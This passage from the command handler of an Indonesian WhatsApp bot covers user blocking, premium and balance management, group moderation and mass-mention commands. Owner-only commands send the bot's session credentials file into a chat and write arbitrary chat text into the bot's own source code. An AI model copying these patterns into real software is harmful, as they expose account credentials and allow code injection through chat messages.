							.catch((err) => m.reply("Gagal!"));
					}
				}
				break;
			case "listblock":
				{
					await jeda(2000);
					let anu = await xzuya.fetchBlocklist();
					m.reply(
						`Total Block : ${anu.length}\n` +
							anu.map((v) => "• " + v.replace(/@.+/, "")).join`\n`
					);
				}
				break;
			case "openblokir":
			case "unblokir":
			case "openblock":
			case "unblock":
				{
					if (!isCreator) return vipReply(mess.owner);
					if (!text && !m.quoted) {
						vipReply(`Contoh: ${prefix + command} 62xxx`);
					} else {
						const numbersOnly = m.isGroup
							? text
								? text.replace(/\D/g, "") + "@s.whatsapp.net"
								: m.quoted?.sender
							: m.chat;
						await xzuya
							.updateBlockStatus(numbersOnly, "unblock")
							.then((a) => vipReply(mess.done))
							.catch((err) => vipReply("Gagal!"));
					}
				}
				break;
			case "adduang":
				{
					if (!isCreator) return vipReply(mess.owner);
					if (!args[0] || !args[1])
						return vipReply(
							`Kirim/tag Nomernya!\nExample:\n${
								prefix + command
							} 62xxx 10`
						);
					const nmrnya =
						args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
					const onWa = await xzuya.onWhatsApp(nmrnya);
					if (!onWa.length > 0)
						return m.reply(
							"Nomer Tersebut Tidak Terdaftar Di Whatsapp!"
						);
					if (db.users[nmrnya] && db.users[nmrnya].uang) {
						addUang(args[1], nmrnya, db);
						m.reply("Sukses Add Uang");
					} else {
						vipReply("User tidak terdaftar di database!");
					}
				}
				break;
			case "addlimit":
				{
					if (!isCreator) return vipReply(mess.owner);
					if (!args[0] || !args[1])
						return m.reply(
							`Kirim/tag Nomernya!\nExample:\n${
								prefix + command
							} 62xxx 10`
						);
					const nmrnya =
						args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
					const onWa = await xzuya.onWhatsApp(nmrnya);
					if (!onWa.length > 0)
						return vipReply(
							"Nomer Tersebut Tidak Terdaftar Di Whatsapp!"
						);
					if (db.users[nmrnya] && db.users[nmrnya].limit) {
						addLimit(args[1], nmrnya, db);
						m.reply("Sukses Add limit");
					} else {
						m.reply("User tidak terdaftar di database!");
					}
				}
				break;
			case "listpc":
				{
					if (!isCreator) return vipReply(mess.owner);
					let anu = await store.chats
						.all()
						.filter((v) => v.id.endsWith(".net"))
						.map((v) => v.id);
					let teks = `● *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`;
					if (anu.length === 0) return vipReply(teks);
					for (let i of anu) {
						if (
							store.messages[i] &&
							store.messages[i].array &&
							store.messages[i].array[0]
						) {
							let nama = store.messages[i].array[0].pushName;
							teks += `${setv} *Nama :* ${nama}\n${setv} *User :* @${
								i.split("@")[0]
							}\n${setv} *Chat :* https://wa.me/${
								i.split("@")[0]
							}\n\n=====================\n\n`;
						}
					}
					await xzuya.sendTextMentions(m.chat, teks, m);
				}
				break;
			case "listgc":
				{
					if (!isCreator) return vipReply(mess.owner);
					const grup = await xzuya.FetchAllParticipating();
					const list = await Object.values(grup);
					let isId = "";
					for (let i of list) {
						isId += `
Grup : ${i.subject}
ID : ${i.id}
Member : ${i.participants.length}
${"—".repeat(7)}`;
					}
					vipReply(isId);
				}
				break;
			case "creategc":
			case "buatgc":
				{
					if (!isCreator) return vipReply(mess.owner);
					if (!text)
						return m.reply(
							`Example:\n${prefix + command} *Nama Gc*`
						);
					let group = await xzuya.groupCreate(q, [m.sender]);
					let res = await xzuya.groupInviteCode(group.id);
					await xzuya.sendMessage(
						m.chat,
						{
							text: `*Link Group :* *https://chat.whatsapp.com/${res}*\n\n*Nama Group :* *${q}*`,
							detectLink: true
						},
						{ quoted: m }
					);
					await xzuya.groupParticipantsUpdate(
						group.id,
						[m.sender],
						"promote"
					);
					await xzuya.sendMessage(group.id, { text: "Done" });
				}
				break;
			case "addpr":
			case "addprem":
			case "addpremium":
				{
					if (!isCreator) return vipReply(mess.owner);
					if (!text)
						return m.reply(
							`Example:\n${prefix + command} @tag|waktu\n${
								prefix + command
							} @${m.sender.split("@")[0]}|30d\n_d = day_`
						);
					let [teks1, teks2] = text.split`|`;
					const nmrnya =
						teks1.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
					const onWa = await xzuya.onWhatsApp(nmrnya);
					if (!onWa.length > 0)
						return m.reply(
							"Nomer Tersebut Tidak Terdaftar Di Whatsapp!"
						);
					if (teks2) {
						if (!db.users[nmrnya] && !db.users[nmrnya].limit)
							return m.reply("Nomer tidak terdaftar di BOT !");
						prem.addPremiumUser(nmrnya, teks2, premium);
						m.reply(
							`Sukses ${command} @${
								nmrnya.split("@")[0]
							} Selama ${teks2}`
						);
						db.users[nmrnya].limit += db.users[nmrnya].vip
							? limit.vip
							: limit.premium;
						db.users[nmrnya].uang += db.users[nmrnya].vip
							? uang.vip
							: uang.premium;
					} else {
						m.reply(
							`Masukkan waktunya!\Example:\n${
								prefix + command
							} @tag|waktu\n${prefix + command} @${
								m.sender.split("@")[0]
							}|30d\n_d = day_`
						);
					}
				}
				break;
			case "delpr":
			case "delprem":
			case "delpremium":
				{
					if (!isCreator) return vipReply(mess.owner);
					if (!text)
						return vipReply(`Example : \n${prefix + command} @tag`);
					const nmrnya =
						text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
					if (!db.users[nmrnya] && !db.users[nmrnya].limit)
						return m.reply("Nomer tidak terdaftar di BOT !");
					if (prem.checkPremiumUser(nmrnya, premium)) {
						premium.splice(
							prem.getPremiumPosition(nmrnya, premium),
							1
						);
						fs.writeFileSync(
							"./database/premium.json",
							JSON.stringify(premium)
						);
						m.reply(`Sukses ${command} @${nmrnya.split("@")[0]}`);
						db.users[nmrnya].limit += db.users[nmrnya].vip
							? limit.vip
							: limit.free;
						db.users[nmrnya].uang += db.users[nmrnya].vip
							? uang.vip
							: uang.free;
					} else {
						m.reply(
							`User @${nmrnya.split("@")[0]} Bukan Premium❗`
						);
					}
				}
				break;
			case "listpr":
			case "listprem":
			case "listpremium":
				{
					if (!isCreator) return vipReply(mess.owner);
					let txt = `*------「 LIST PREMIUM 」------*\n\n`;
					for (let userprem of premium) {
						txt += `➸ *Nomer*: @${
							userprem.id.split("@")[0]
						}\n➸ *Limit*: ${
							db.users[userprem.id].limit
						}\n➸ *Uang*: ${db.users[
							userprem.id
						].uang.toLocaleString(
							"id-ID"
						)}\n➸ *Expired*: ${formatDate(userprem.expired)}\n\n`;
					}
					m.reply(txt);
				}
				break;
			case "addcase":
				{
					if (!isCreator) return vipReply(mess.owner);
					if (!text && !text.startsWith("case"))
						return m.reply("Masukkan Casenya!");
					fs.readFile("xzuya.js", "utf8", (err, data) => {
						if (err) {
							console.error(
								"Terjadi kesalahan saat membaca file:",
								err
							);
							return;
						}
						const posisi = data.indexOf("case '19rujxl1e':");
						if (posisi !== -1) {
							const codeBaru =
								data.slice(0, posisi) +
								"\n" +
								`${text}` +
								"\n" +
								data.slice(posisi);
							fs.writeFile(
								"xzuya.js",
								codeBaru,
								"utf8",
								(err) => {
									if (err) {
										m.reply(
											"Terjadi kesalahan saat menulis file: ",
											err
										);
									} else {
										m.reply("Case berhasil ditambahkan");
									}
								}
							);
						} else {
							m.reply("Gagal Menambahkan case!");
						}
					});
				}
				break;
			case "getcase":
				{
					if (!isCreator) return vipReply(mess.owner);
					if (!text) return m.reply("Masukkan Nama Casenya!");
					const getCase = (cases) => {
						return (
							"case" +
							`'${cases}'` +
							fs
								.readFileSync("xzuya.js")
								.toString()
								.split("case '" + cases + "'")[1]
								.split("break")[0] +
							"break"
						);
					};
					m.reply(`${getCase(text)}`);
				}
				break;
			case "delcase":
				{
					if (!isCreator) return vipReply(mess.owner);
					if (!text) return m.reply("Masukkan Nama Casenya!");
					fs.readFile("xzuya.js", "utf8", (err, data) => {
						if (err) {
							console.error(
								"Terjadi kesalahan saat membaca file:",
								err
							);
							return;
						}
						const regex = new RegExp(
							`case\\s+'${text.toLowerCase()}':[\\s\\S]*?break`,
							"g"
						);
						const modifiedData = data.replace(regex, "");
						fs.writeFile(
							"xzuya.js",
							modifiedData,
							"utf8",
							(err) => {
								if (err) {
									m.reply(
										"Terjadi kesalahan saat menulis file: ",
										err
									);
								} else {
									m.reply("Case berhasil dihapus dari file");
								}
							}
						);
					});
				}
				break;
			case "getsession":
				{
					if (!isCreator) return vipReply(mess.owner);
					await xzuya.sendMessage(
						m.chat,
						{
							document: fs.readFileSync("./xzuyadev/creds.json"),
							mimetype: "application/json",
							fileName: "creds.json"
						},
						{ quoted: m }
					);
				}
				break;
			case "deletesession":
			case "delsession":
				{
					if (!isCreator) return vipReply(mess.owner);
					fs.readdir("./xzuyadev", async function (err, files) {
						if (err) {
							console.log("Unable to scan directory: " + err);
							return m.reply("Unable to scan directory: " + err);
						}
						let filteredArray = await files.filter(
							(item) =>
								item.startsWith("pre-key") ||
								item.startsWith("sender-key") ||
								item.startsWith("session-")
						);
						let teks = `Terdeteksi ${filteredArray.length} Session file\n\n`;
						if (filteredArray.length == 0) return m.reply(teks);
						filteredArray.map(function (e, i) {
							teks += i + 1 + `. ${e}\n`;
						});
						if (text && text == "true") {
							let { key } = await m.reply(
								"Menghapus Session File.."
							);
							await filteredArray.forEach(function (file) {
								fs.unlinkSync("./xzuyadev/" + file);
							});
							sleep(2000);
							m.reply("Berhasil Menghapus Semua Sampah Session", {
								edit: key
							});
						} else
							m.reply(
								teks +
									`\nKetik _${
										prefix + command
									} true_\nUntuk Menghapus`
							);
					});
				}
				break;
			case "deletesampah":
			case "delsampah":
				{
					if (!isCreator) return vipReply(mess.owner);
					fs.readdir(
						"./database/sampah",
						async function (err, files) {
							if (err) {
								console.log("Unable to scan directory: " + err);
								return m.reply(
									"Unable to scan directory: " + err
								);
							}
							let filteredArray = await files.filter(
								(item) =>
									item.endsWith("gif") ||
									item.endsWith("png") ||
									item.endsWith("mp3") ||
									item.endsWith("mp4") ||
									item.endsWith("jpg") ||
									item.endsWith("webp") ||
									item.endsWith("webm") ||
									item.endsWith("opus") ||
									item.endsWith("jpeg")
							);
							let teks = `Terdeteksi ${filteredArray.length} Sampah file\n\n`;
							if (filteredArray.length == 0) return m.reply(teks);
							filteredArray.map(function (e, i) {
								teks += i + 1 + `. ${e}\n`;
							});
							if (text && text == "true") {
								let { key } = await m.reply(
									"Menghapus Sampah File.."
								);
								await filteredArray.forEach(function (file) {
									fs.unlinkSync("./database/sampah/" + file);
								});
								sleep(2000);
								vipReply("Berhasil Menghapus Semua Sampah", {
									edit: key
								});
							} else
								vipReply(
									teks +
										`\nKetik _${
											prefix + command
										} true_\nUntuk Menghapus`
								);
						}
					);
				}
				break;
			// Group Menu
			case "add":
				{
					if (!m.isGroup) return vipReply(mess.group);
					if (!m.isAdmin) return vipReply(mess.admin);
					if (!m.isBotAdmin) return vipReply(mess.botAdmin);
					if (!text && !m.quoted) {
						vipReply(`Contoh: ${prefix + command} 62xxx`);
					} else {
						const numbersOnly = text
							? text.replace(/\D/g, "") + "@s.whatsapp.net"
							: m.quoted?.sender;
						try {
							await xzuya
								.groupParticipantsUpdate(
									m.chat,
									[numbersOnly],
									"add"
								)
								.then(async (res) => {
									for (let i of res) {
										let invv = await xzuya.groupInviteCode(
											m.chat
										);
										if (i.status == 408)
											return vipReply(
												"Dia Baru-Baru Saja Keluar Dari Grub Ini!"
											);
										if (i.status == 401)
											return vipReply(
												"Dia Memblokir Bot!"
											);
										if (i.status == 409)
											return vipReply("Dia Sudah Join!");
										if (i.status == 500)
											return vipReply("Grub Penuh!");
										if (i.status == 403) {
											await xzuya.sendMessage(
												m.chat,
												{
													text: `@${
														numbersOnly.split(
															"@"
														)[0]
													} Tidak Dapat Ditambahkan\n\nKarena Target Private\n\nUndangan Akan Dikirimkan Ke\n-> wa.me/${numbersOnly.replace(
														/\D/g,
														""
													)}\nMelalui Jalur Pribadi`,
													mentions: [numbersOnly]
												},
												{ quoted: m }
											);
											await xzuya
												.sendMessage(
													`${
														numbersOnly
															? numbersOnly
															: "6282113821188@s.whatsapp.net"
													}`,
													{
														text: `${
															"https://chat.whatsapp.com/" +
															invv
														}\n------------------------------------------------------\n\nAdmin: @${
															m.sender.split(
																"@"
															)[0]
														}\nMengundang anda ke group ini\nSilahkan masuk jika berkehendak🙇`,
														detectLink: true,
														mentions: [
															numbersOnly,
															m.sender
														]
													},
													{ quoted: fkontak }
												)
												.catch((err) =>
													vipReply(
														"Gagal Mengirim Undangan!"
													)
												);
										} else if (i.status !== 200) {
											vipReply("Gagal Add User");
										}
									}
								});
						} catch (e) {
							vipReply("Gagal Add User");
						}
					}
				}
				break;
			case "kick":
				{
					await jeda(2000);
					if (!m.isGroup) return vipReply(mess.group);
					if (!m.isAdmin) return vipReply(mess.admin);
					if (!m.isBotAdmin) return vipReply(mess.botAdmin);
					if (!text && !m.quoted) {
						vipReply(`Contoh: ${prefix + command} 62xxx`);
					} else {
						const numbersOnly = text
							? text.replace(/\D/g, "") + "@s.whatsapp.net"
							: m.quoted?.sender;
						await xzuya
							.groupParticipantsUpdate(
								m.chat,
								[numbersOnly],
								"remove"
							)
							.catch((err) => vipReply("Gagal Kick User!"));
					}
				}
				break;
			case "promote":
				{
					if (!m.isGroup) return vipReply(mess.group);
					if (!m.isAdmin) return vipReply(mess.admin);
					if (!m.isBotAdmin) return vipReply(mess.botAdmin);
					if (!text && !m.quoted) {
						vipReply(`Contoh: ${prefix + command} 62xxx`);
					} else {
						const numbersOnly = text
							? text.replace(/\D/g, "") + "@s.whatsapp.net"
							: m.quoted?.sender;
						await xzuya
							.groupParticipantsUpdate(
								m.chat,
								[numbersOnly],
								"promote"
							)
							.catch((err) => vipReply("Gagal!"));
					}
				}
				break;
			case "demote":
				{
					await jeda(2000);
					if (!m.isGroup) return vipReply(mess.group);
					if (!m.isAdmin) return vipReply(mess.admin);
					if (!m.isBotAdmin) return vipReply(mess.botAdmin);
					if (!text && !m.quoted) {
						vipReply(`Contoh: ${prefix + command} 62xxx`);
					} else {
						const numbersOnly = text
							? text.replace(/\D/g, "") + "@s.whatsapp.net"
							: m.quoted?.sender;
						await xzuya
							.groupParticipantsUpdate(
								m.chat,
								[numbersOnly],
								"demote"
							)
							.catch((err) => vipReply("Gagal!"));
					}
				}
				break;
			case "setname":
			case "setnamegc":
			case "setsubject":
			case "setsubjectgc":
				{
					if (!m.isGroup) return vipReply(mess.group);
					if (!m.isAdmin) return vipReply(mess.admin);
					if (!m.isBotAdmin) return vipReply(mess.botAdmin);
					if (!text && !m.quoted) {
						vipReply(`Contoh: ${prefix + command} textnya`);
					} else {
						const teksnya = text ? text : m.quoted.text;
						await xzuya
							.groupUpdateSubject(m.chat, teksnya)
							.catch((err) => vipReply("Gagal!"));
					}
				}
				break;
			case "setdesc":
			case "setdescgc":
			case "setdesk":
			case "setdeskgc":
				{
					if (!m.isGroup) return vipReply(mess.group);
					if (!m.isAdmin) return vipReply(mess.admin);
					if (!m.isBotAdmin) return vipReply(mess.botAdmin);
					if (!text && !m.quoted) {
						vipReply(`Contoh: ${prefix + command} textnya`);
					} else {
						const teksnya = text ? text : m.quoted.text;
						await xzuya
							.groupUpdateDescription(m.chat, teksnya)
							.catch((err) => vipReply("Gagal!"));
					}
				}
				break;
			case "setppgroups":
			case "setppgrup":
			case "setppgc":
				{
					if (!m.isGroup) return vipReply(mess.group);
					if (!m.isAdmin) return vipReply(mess.admin);
					if (!m.isBotAdmin) return vipReply(mess.botAdmin);
					if (!m.quoted)
						return m.reply(
							"Reply Gambar yang mau dipasang di Profile Bot"
						);
					if (!/image/.test(mime) && /webp/.test(mime))
						return m.reply(
							`Reply Image Dengan Caption ${prefix + command}`
						);
					let media = await xzuya.downloadAndSaveMediaMessage(
						quoted,
						"ppgc.jpeg"
					);
					if (text.length > 0) {
						let { img } = await generateProfilePicture(media);
						await xzuya.query({
							tag: "iq",
							attrs: {
								to: m.chat,
								type: "set",
								xmlns: "w:profile:picture"
							},
							content: [
								{
									tag: "picture",
									attrs: { type: "image" },
									content: img
								}
							]
						});
						await fs.unlinkSync(media);
						m.reply("Sukses");
					} else {
						await xzuya.updateProfilePicture(m.chat, {
							url: media
						});
						await fs.unlinkSync(media);
						m.reply("Sukses");
					}
				}
				break;
			case "delete":
			case "del":
			case "d":
				{
					if (!m.quoted)
						return m.reply("Reply pesan yang mau di delete");
					await xzuya.sendMessage(m.chat, {
						delete: {
							remoteJid: m.chat,
							fromMe: m.isBotAdmin ? false : true,
							id: m.quoted.id,
							participant: m.quoted.sender
						}
					});
				}
				break;
			case "linkgroup":
			case "linkgrup":
			case "linkgc":
			case "urlgroup":
			case "urlgrup":
			case "urlgc":
				{
					if (!m.isGroup) return vipReply(mess.group);
					if (!m.isAdmin) return vipReply(mess.admin);
					if (!m.isBotAdmin) return m.reply(mess.botAdmin);
					let response = await xzuya.groupInviteCode(m.chat);
					await xzuya.sendMessage(
						m.chat,
						{
							text: `https://chat.whatsapp.com/${response}\n\nLink Group : ${
								(await xzuya.groupMetadata(m.chat)).subject
							}`,
							detectLink: true
						},
						{ quoted: m }
					);
				}
				break;
			case "revoke":
			case "newlink":
			case "newurl":
				{
					if (!m.isGroup) return vipReply(mess.group);
					if (!m.isAdmin) return vipReply(mess.admin);
					if (!m.isBotAdmin) return m.reply(mess.botAdmin);
					await xzuya
						.groupRevokeInvite(m.chat)
						.then((a) => {
							m.reply(
								`Sukses Menyetel Ulang, Tautan Undangan Grup ${m.metadata.subject}`
							);
						})
						.catch((err) => m.reply("Gagal!"));
				}
				break;
			case "group":
			case "grup":
				{
					if (!m.isGroup) return vipReply(mess.group);
					if (!m.isAdmin) return vipReply(mess.admin);
					if (!m.isBotAdmin) return m.reply(mess.botAdmin);
					if (text === "close") {
						await xzuya
							.groupSettingUpdate(m.chat, "announcement")
							.then((res) => m.reply(`*Sukses Menutup Group*`));
					} else if (text === "open") {
						await xzuya
							.groupSettingUpdate(m.chat, "not_announcement")
							.then((res) => m.reply(`*Sukses Membuka Group*`));
					} else if (text && text.startsWith("set")) {
						let buttonnya = [
							{
								name: "single_select",
								buttonParamsJson: {
									title: "Pilih",
									sections: [
										{
											title: "Mode Group",
											rows: [
												{
													title: "Open Group",
													description:
														"Membuka Group",
													id: ".grup open"
												},
												{
													title: "Close Group",
													description:
														"Menutup Group",
													id: ".grup close"
												}
											]
										}
									]
								}
							}
						];
						await xzuya.sendButtonMsg(
							m.chat,
							"Mode Group",
							ucapanWaktu,
							"Silahkan dipilih 🎋",
							null,
							buttonnya,
							m
						);
					} else {
						let anu = db.groups[m.chat];
						m.reply(
							`${m.metadata.subject}\n- Anti Link : ${
								anu.antilink ? "✅" : "❌"
							}\n- Anti Virtex : ${
								anu.antivirtex ? "✅" : "❌"
							}\n- Anti Delete : ${
								anu.antidelete ? "✅" : "❌"
							}\n- Welcome : ${anu.welcome ? "✅" : "❌"}`
						);
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "antilink":
				{
					if (!m.isGroup) return vipReply(mess.group);
					if (!m.isAdmin) return vipReply(mess.admin);
					if (!m.isBotAdmin) return m.reply(mess.botAdmin);
					if (text === "on") {
						if (db.groups[m.chat].antilink)
							return m.reply("*Sudah Aktif Sebelumnya*");
						db.groups[m.chat].antilink = true;
						m.reply("*Anti Link Aktif !*");
					} else if (text === "off") {
						db.groups[m.chat].antilink = false;
						m.reply("*Anti Link Tidak Aktif !*");
					} else {
						let buttonnya = [
							{
								name: "single_select",
								buttonParamsJson: {
									title: "Pilih",
									sections: [
										{
											title: "Anti Link",
											rows: [
												{
													title: "Anti Link Aktif",
													description:
														"Mengaktifkan Antilink",
													id: ".antilink on"
												},
												{
													title: "Anti Link Tidak Aktif",
													description:
														"Mematikan Antilink",
													id: ".antilink off"
												}
											]
										}
									]
								}
							}
						];
						await xzuya.sendButtonMsg(
							m.chat,
							"Mode Group",
							ucapanWaktu,
							"Silahkan dipilih 🎋",
							null,
							buttonnya,
							m
						);
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "antivirtex":
				{
					if (!m.isGroup) return vipReply(mess.group);
					if (!m.isAdmin) return vipReply(mess.admin);
					if (!m.isBotAdmin) return m.reply(mess.botAdmin);
					if (text === "on") {
						if (db.groups[m.chat].antivirtex)
							return m.reply("*Sudah Aktif Sebelumnya*");
						db.groups[m.chat].antivirtex = true;
						m.reply("*Anti Virtex Aktif !*");
					} else if (text === "off") {
						db.groups[m.chat].antivirtex = false;
						m.reply("*Anti Virtex Tidak Aktif !*");
					} else {
						let buttonnya = [
							{
								name: "single_select",
								buttonParamsJson: {
									title: "Pilih",
									sections: [
										{
											title: "Anti Virtex",
											rows: [
												{
													title: "Anti Virtex Aktif",
													description:
														"Mengaktifkan Antivirtex",
													id: ".antivirtex on"
												},
												{
													title: "Anti Virtex Tidak Aktif",
													description:
														"Mematikan Antivirtex",
													id: ".antivirtex off"
												}
											]
										}
									]
								}
							}
						];
						await xzuya.sendButtonMsg(
							m.chat,
							"Mode Group",
							ucapanWaktu,
							"Silahkan dipilih 🎋",
							null,
							buttonnya,
							m
						);
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "antidelete":
				{
					if (!m.isGroup) return vipReply(mess.group);
					if (!m.isAdmin) return vipReply(mess.admin);
					if (!m.isBotAdmin) return m.reply(mess.botAdmin);
					if (text === "on") {
						if (db.groups[m.chat].antidelete)
							return m.reply("*Sudah Aktif Sebelumnya*");
						db.groups[m.chat].antidelete = true;
						m.reply("*Anti Delete Aktif !*");
					} else if (text === "off") {
						db.groups[m.chat].antidelete = false;
						m.reply("*Anti Delete Tidak Aktif !*");
					} else {
						let buttonnya = [
							{
								name: "single_select",
								buttonParamsJson: {
									title: "Pilih",
									sections: [
										{
											title: "Anti Delete",
											rows: [
												{
													title: "Anti Delete Aktif",
													description:
														"Mengaktifkan Antidelete",
													id: ".antidelete on"
												},
												{
													title: "Anti Delete Tidak Aktif",
													description:
														"Mematikan Antidelete",
													id: ".antidelete off"
												}
											]
										}
									]
								}
							}
						];
						await xzuya.sendButtonMsg(
							m.chat,
							"Mode Group",
							ucapanWaktu,
							"Silahkan dipilih 🎋",
							null,
							buttonnya,
							m
						);
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "wel":
				{
					if (!isCreator) return vipReply(mess.owner);
					if (text === "on") {
						if (db.groups[m.chat].welcome)
							return m.reply("*Sudah Aktif Sebelumnya*");
						db.groups[m.chat].welcome = true;
						m.reply("*Welcome Aktif !*");
					} else if (text === "off") {
						db.groups[m.chat].welcome = false;
						m.reply("*Welcome Tidak Aktif !*");
					}
				}
				break;
			case "welcome":
				{
					if (!m.isGroup) return vipReply(mess.group);
					if (!m.isAdmin) return vipReply(mess.admin);
					if (!m.isBotAdmin) return m.reply(mess.botAdmin);
					if (text === "on") {
						if (db.groups[m.chat].welcome)
							return m.reply("*Sudah Aktif Sebelumnya*");
						db.groups[m.chat].welcome = true;
						m.reply("*Welcome Aktif !*");
					} else if (text === "off") {
						db.groups[m.chat].welcome = false;
						m.reply("*Welcome Tidak Aktif !*");
					} else {
						let buttonnya = [
							{
								name: "single_select",
								buttonParamsJson: {
									title: "Pilih",
									sections: [
										{
											title: "Welcome",
											rows: [
												{
													title: "Welcome Aktif",
													description:
														"Mengaktifkan Welcome",
													id: ".welcome on"
												},
												{
													title: "Welcome Tidak Aktif",
													description:
														"Mematikan Welcome",
													id: ".welcome off"
												}
											]
										}
									]
								}
							}
						];
						await xzuya.sendButtonMsg(
							m.chat,
							"Mode Group",
							ucapanWaktu,
							"Silahkan dipilih 🎋",
							null,
							buttonnya,
							m
						);
					}
				}
				break;
			case "woii":
				{
					if (!isCreator) return vipReply(mess.owner);
					xzuya.sendMessage(
						m.chat,
						{
							text: q ? q : "",
							mentions: m.metadata.participants.map((a) => a.id)
						},
						{ quoted: fkontak }
					);
				}
				break;
			case "tagall":
				{
					if (!m.isGroup) return vipReply(mess.group);
					if (!m.isAdmin) return vipReply(mess.admin);
					if (!m.isBotAdmin) return m.reply(mess.botAdmin);
					let setv = pickRandom(listv);
					let teks = `*Tag All*\n\n*Pesan :* ${q ? q : ""}\n\n`;
					for (let mem of m.metadata.participants) {
						teks += `${setv} @${mem.id.split("@")[0]}\n`;
					}
					await xzuya.sendMessage(
						m.chat,
						{
							text: teks,
							mentions: m.metadata.participants.map((a) => a.id)
						},
						{ quoted: m }
					);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "own":
				{
					if (!isCreator) return;
					xzuya.sendMessage(
						m.chat,
						{
							text: q ? q : "",
							mentions: m.metadata.participants.map((a) => a.id)
						},
						{ quoted: fVerif }
					);
				}
				break;
			case "hidetag":
			case "h":
				{
					if (!m.isGroup) return vipReply(mess.group);
					if (!m.isAdmin) return vipReply(mess.admin);
					if (!m.isBotAdmin) return m.reply(mess.botAdmin);
					if (cekLimit(m, db)) return m.reply(mess.limit);
					xzuya.sendMessage(
						m.chat,
						{
							text: q ? q : "",
							mentions: m.metadata.participants.map((a) => a.id)
						},
						{ quoted: m }
					);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "totag":
				{
					if (!m.isGroup) return vipReply(mess.group);
					if (!m.isAdmin) return vipReply(mess.admin);
					if (!m.isBotAdmin) return m.reply(mess.botAdmin);
					if (!m.quoted)
						return m.reply(
							`Reply pesan dengan caption ${prefix + command}`
						);
					delete m.quoted.chat;
					await xzuya.sendMessage(m.chat, {
						forward: m.quoted.fakeObj,
						mentions: m.metadata.participants.map((a) => a.id)
					});
					db.users[m.sender].limit -= 1;
				}
				break;
			case "listonline":
			case "liston":
				{
					if (!m.isGroup) return vipReply(mess.group);
					let id =
						args && /\d+\-\d+@g.us/.test(args[0])
							? args[0]
							: m.chat;
					if (!store.presences || !store.presences[id])
						return m.reply("Sedang Tidak ada yang online!");
					let online = [
						...Object.keys(store.presences[id]),
						botNumber
					];
					await xzuya
						.sendMessage(
							m.chat,
							{
								text:
									"List Online:\n\n" +
									online.map(
										(v) =>
											setv + " @" + v.replace(/@.+/, "")
									).join`\n`,
								mentions: online
							},
							{ quoted: m }
						)
						.catch((e) => m.reply("Gagal"));
					db.users[m.sender].limit -= 1;
				}
				break;

			// Bot Menu
			case "owner":
				{
					await xzuya.sendContact(m.chat, owner, m);
				}
				break;
			case "profile":
			case "cek":
			case "me":
				{
					await jeda(2000);
					const user = Object.keys(db.users);
					const infoUser = db.users[m.sender];
					await m.reply(
						`*👤Profile @${
							m.sender.split("@")[0]
						}* :\n🐋User Bot : ${
							user.includes(m.sender) ? "True" : "False"
						}\n🔥User : ${
							isVip ? "VIP" : isPremium ? "PREMIUM" : "FREE"
						}\n🎫Limit : ${infoUser.limit}\n💰Uang : ${
							infoUser
								? infoUser.uang.toLocaleString("id-ID")
								: "0"
						}`
					);
				}
				break;
			case "leaderboard":
				{
					await jeda(2000);
					const entries = Object.entries(db.users)
						.sort((a, b) => b[1].uang - a[1].uang)
						.slice(0, 10)
						.map((entry) => entry[0]);
					let teksnya = "╭──❍「 *LEADERBOARD* 」❍\n";
					for (let i = 0; i < entries.length; i++) {
						teksnya += `│• ${i + 1}. @${
							entries[i].split("@")[0]
						}\n│• Balance : ${db.users[
							entries[i]
						].uang.toLocaleString("id-ID")}\n│\n`;
					}
					m.reply(teksnya + "╰──────❍");
					db.users[m.sender].limit -= 1;
				}
				break;
			case "req":
			case "request":
				{
					if (!text) return m.reply("Mau Request apa ke Owner?");
					await xzuya.sendMessage(
						m.chat,
						{
							text: `*Request Telah Terkirim Ke Owner*\n_Terima Kasih🙏_`
						},
						{ quoted: m }
					);
					await xzuya.sendFromOwner(
						owner,
						`Pesan Dari : @${
							m.sender.split("@")[0]
						}\nUntuk Owner\n\nRequest ${text}`,
						m,
						{
							contextInfo: {
								mentionedJid: [m.sender],
								isForwarded: true
							}
						}
					);
				}
				break;
			case "totalfitur":
				{
					const total = (
						fs
							.readFileSync("./xzuya.js")
							.toString()
							.match(/case '/g) || []
					).length;
					m.reply(`Total Fitur : ${total}`);
				}
				break;
			case "daily":
			case "claim":
				{
					await jeda(2000);
					daily(m, db);
				}
				break;
			case "transfer":
			case "tf":
				{
					await jeda(2000);
					transfer(m, args, db);
				}
				break;
			case "buy":
				{
					buy(m, args, db);
				}
				break;
			case "react":
				{
					await jeda(2000);
					xzuya.sendMessage(m.chat, {
						react: {
							text: args[0],
							key: m.quoted ? m.quoted.key : m.key
						}
					});
				}
				break;
			case "tagme":
				{
					xzuya.sendMessage(
						m.chat,
						{
							text: `@${m.sender.split("@")[0]}`,
							mentions: [m.sender]
						},
						{ quoted: m }
					);
				}
				break;
			case "runtime":
			case "tes":
			case "bot":
				{
					if (text && text.startsWith("--") && isCreator) {
						let buttonnya = [
							{
								name: "single_select",
								buttonParamsJson: {
									title: "Pilih",
									sections: [
										{
											title: "Bot Settings",
											rows: [
												{
													title: "Anti Call On🟢",
													description:
														"Mengaktifkan Anti Call",
													id: ".bot anticall on"
												},
												{
													title: "Anti Call Off🔴",
													description:
														"Mematikan Anti Call",
													id: ".bot anticall off"
												},
												{
													title: "Auto Bio On🟢",
													description:
														"Mengaktifkan Auto Bio",
													id: ".bot autobio on"
												},
												{
													title: "Auto Bio Off🔴",
													description:
														"Mematikan Auto Bio",
													id: ".bot autobio off"
												},
												{
													title: "Auto Read On🟢",
													description:
														"Mengaktifkan Auto Read",
													id: ".bot autoread on"
												},
												{
													title: "Auto Read Off🔴",
													description:
														"Mematikan Auto Read",
													id: ".bot autoread off"
												},
												{
													title: "Auto Type On🟢",
													description:
														"Mengaktifkan Auto Type",
													id: ".bot autotype on"
												},
												{
													title: "Auto Type Off🔴",
													description:
														"Mematikan Auto Type",
													id: ".bot autotype off"
												},
												{
													title: "Read SW On🟢",
													description:
														"Mengaktifkan Read SW",
													id: ".bot readsw on"
												},
												{
													title: "Read SW Off🔴",
													description:
														"Mematikan Read SW",
